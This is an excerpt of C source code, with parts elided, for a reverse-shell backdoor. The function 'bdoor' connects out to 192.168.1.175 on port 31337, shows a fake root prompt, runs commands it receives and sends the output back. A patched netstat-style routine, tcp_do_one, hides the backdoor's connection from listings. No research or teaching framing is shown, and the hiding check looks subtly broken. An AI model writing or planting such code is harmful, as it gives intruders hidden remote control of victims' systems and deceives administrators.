...
#define PORT 31337
#define SERVER_IP "192.168.1.175"
#define BUFFER_SIZE 1024
#define RESPINSE_SIZE 4096
...
int bdoor(void) {
  ...
  if (connect(sockefd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
	return 1;
  }

  while(1){
    char prompt[] = "root@localhost:~# ";
    send(sockefd, prompt, strlen(prompt), 0);
    memset(buffer, 0, BUFFER_SIZE);
	bytes_received = recv(sockefd, buffer, BUFFER_SIZE, 0);
	...
	while (fgets(response, sizeof(response)-1, fp) != NULL) {
		send(sockefd, response, strlen(response), 0);
	}
	pclose(fp);
  }
  close(sockefd);
...
static void tcp_do_one(int lnr, const char *line, const char *prot)
{
	...
	char bdoor_rem_addr[128];
	sprintf(bdoor_rem_addr, "%s%d", SERVER_IP, PORT);
	if (strcmp(rem_addr, bdoor_rem_addr) == 0) {
		return;
	}
